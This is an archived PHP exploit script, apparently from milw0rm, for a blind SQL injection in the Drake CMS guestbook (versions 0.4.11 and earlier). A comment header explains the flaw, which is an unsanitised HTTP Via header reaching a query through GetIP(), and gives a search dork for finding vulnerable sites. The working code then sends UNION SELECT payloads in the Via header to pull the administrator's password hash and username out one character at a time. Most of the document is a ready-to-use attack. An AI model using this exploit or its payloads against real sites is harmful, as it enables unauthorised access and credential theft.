<html><head><title>Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit</title></head><pre>&lt;?php

/*
	------------------------------------------------------
	Drake CMS &lt;= 0.4.11 Remote Blind SQL Injection Exploit
	------------------------------------------------------

	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://drakecms.sourceforge.net/
	dork.....: &quot;Powered by Drake CMS&quot; inurl:index.php?option=guestbook
	
	[-] Blind SQL Injection in /components/guestbook/guestbook.php

	15.	case &quot;insert&quot; :
	16.		if (!$my-&gt;gid) {
	17.			if ('' === ($gb_name = in('gb_name', __SQL | __NOHTML, $_POST, '', 50))
	18.				|| ('' === ($gb_email = in('gb_email', __SQL | __NOHTML, $_POST, '', 50)))
	19.				|| !is_email($gb_email)
	20.				)
	21.				CMSResponse::Back(_FORM_NC);
	22.		} else {
	23.			$gb_name = $my-&gt;name;
	24.			$gb_email = $my-&gt;email;
	25.		}
	26.	
	27.		$timeout = $params-&gt;get('timeout',5);
	28.	
	29.		$row = $conn-&gt;GetRow(&quot;SELECT id,ip,date FROM #__guestbook WHERE ip ='&quot;.$my-&gt;GetIP().&quot;' AND date &gt; '&quot;.($time-($timeout*60)).&quot;' &quot;); &lt;==
	30.	
	31.		if(!count($row)) {
	32.			if ($params-&gt;get('captcha') &amp;&amp; !$my-&gt;valid_captcha())
	33.				break;
	34.			
	35.			$gb_url = in('gb_url', __SQL | __NOHTML, $_POST, '');
	36.			$gb_country = in('gb_country', __SQL | __NOHTML, $_POST, '', 50);
	37.			$gb_title = in('gb_title', __SQL | __NOHTML, $_POST, '', 255);
	38.			$gb_message = in('gb_message', __SQL | __NOHTML, $_POST, '');
	39.	
	40.			$conn-&gt;Insert('#__guestbook', '(name,email,url,country,title,message,ip,date)',&quot;'$gb_name','$gb_email','$gb_url', (...)
	41.	
	42.		} else
	43.			echo _GUESTBOOK_DOUBLE_SIGN;
	
	if you analize GetIP() function defined into /classes/user.php (lines 61-66) you can see that an attacker
	could be inject arbitrary SQL code through http via header...this results in a blind SQL injection at line 29
	
	[-] look at /includes/retrieve_ip.php
	
	69.		if(isset($_SERVER['HTTP_VIA'])) {
	70.			// case 2: 
	71.			// proxy &amp;&amp; HTTP_(X_) FORWARDED (_FOR) not defined &amp;&amp; HTTP_VIA defined
	72.			// other exotic variables may be defined 
	73.			return ( $_SERVER['HTTP_VIA'].$x_coming_from.$coming_from ) ; &lt;== this is the same value returned from GetIP()
	74.		}
	
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...\n&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function check_query($sql)
{
	global $host, $path;
	
	$payload = &quot;gb_name=null&amp;gb_email=foo%40bar.com&amp;task=insert&quot;;
	$packet  = &quot;POST {$path}index.php?option=guestbook HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Via: {$sql}\r\n&quot;;
	$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	return (!preg_match(&quot;/UNION\/\*\*\/SELECT/&quot;, http_send($host, $packet)));
}

print &quot;\n+----------------------------------------------------------------+&quot;;
print &quot;\n| Drake CMS &lt;= 0.4.11 Remote Blind SQL Injection Exploit by EgiX |&quot;;
print &quot;\n+----------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......:	php $argv[0] host path [userid] [prefix]\n&quot;;
	print &quot;\nhost.......:	target server (ip/hostname)&quot;;
	print &quot;\npath.......:	path to Drake CMS directory (example: / or /drake/)&quot;;
	print &quot;\nuserid.....:	user id (default: 1 - admin)&quot;;
	print &quot;\nprefix.....:	table's prefix (default: dk_)\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];
$uid  = (isset($argv[3]) ? $argv[3] : &quot;1&quot;);
$pre  = (isset($argv[4]) ? $argv[4] : &quot;dk_&quot;);

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = &quot;&quot;;
print &quot;\n[-] MD5 Hash: &quot;;

while (!strpos($md5, chr(0)))
{
	for ($i = 0, $n = count($hash); $i &lt;= $n; $i++)
	{
  		if ($i == $n) die(&quot;\n\n[-] Exploit failed...\n&quot;);
		$sql = &quot;-1'/**/UNION/**/SELECT/**/password,1,1/**/FROM/**/{$pre}users/**/WHERE/**/ORD(SUBSTR(password,{$index},1))={$hash[$i]}/**/AND/**/id={$uid}/*&quot;;
		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}

	$index++;
}

$char = array(0); // null char
for ($j = 97; $j &lt;= 122; $j++) $char = array_merge($char, array($j)); // a-z
for ($j = 65; $j &lt;= 90; $j++) $char = array_merge($char, array($j)); // A-Z
for ($j = 48; $j &lt;= 57; $j++) $char = array_merge($char, array($j)); // 0-9

$index = 1; $user = &quot;&quot;;
print &quot;\n[-] Username: &quot;;

while (!strpos($user, chr(0)))
{
	for ($i = 0, $n = count($char); $i &lt;= $n; $i++)
	{
  		if ($i == $n) die(&quot;\n\n[-] Exploit failed...\n&quot;);
		$sql = &quot;-1'/**/UNION/**/SELECT/**/username,1,1/**/FROM/**/{$pre}users/**/WHERE/**/ORD(SUBSTR(username,{$index},1))={$char[$i]}/**/AND/**/id={$uid}/*&quot;;
		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
	}

	$index++;
}

print &quot;\n\n[-] Successfull!\n&quot;;

?&gt;

# milw0rm.com [2008-04-07]</pre></html>